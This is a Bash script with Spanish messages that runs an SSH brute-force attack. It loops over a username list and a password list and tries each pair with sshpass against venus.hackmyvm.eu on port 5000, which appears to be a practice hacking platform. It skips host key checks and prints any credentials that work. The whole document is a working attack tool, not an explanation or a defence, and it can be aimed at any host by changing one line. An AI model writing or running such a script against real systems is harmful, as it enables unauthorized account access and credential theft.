#!/bin/bash

# Verificar que se pasaron los argumentos
if [ $# -ne 2 ]; then
    echo "Uso: $0 <archivo_usuarios> <archivo_contrasenas>"
    echo "Ejemplo: $0 usuarios.txt contrasenas.txt"
    exit 1
fi

usuarios="$1"
contraseñaarch="$2"

# Verificar que los archivos existen
if [ ! -f "$usuarios" ]; then
    echo "Error: El archivo $usuarios no existe"
    exit 1
fi

if [ ! -f "$contraseñaarch" ]; then
    echo "Error: El archivo $contraseñaarch no existe"
    exit 1
fi

echo "Iniciando ataque de fuerza bruta..."
echo "Objetivo: venus.hackmyvm.eu:5000"
echo "Usuarios: $usuarios"
echo "Contraseñas: $contraseñaarch"
echo "========================================"

while IFS= read -r usuario; do
    # Saltar líneas vacías
    [ -z "$usuario" ] && continue
    
    echo "Probando usuario: $usuario"
    
    while IFS= read -r contraseña; do
        # Saltar líneas vacías
        [ -z "$contraseña" ] && continue
        
        echo -n "  Probando contraseña: $contraseña... "
        
        # Intentar conexión SSH
        timeout 5 sshpass -p "$contraseña" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 "$usuario"@venus.hackmyvm.eu -p 5000 "whoami 2>/dev/null" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo "¡ÉXITO!"
            echo "========================================"
            echo "Credenciales encontradas:"
            echo "Usuario: $usuario"
            echo "Contraseña: $contraseña"
            echo "========================================"
            exit 0
        else
            echo "Fallo"
        fi
    done < "$contraseñaarch"
    
done < "$usuarios"

echo "========================================"
echo "No se encontraron credenciales válidas"
exit 1
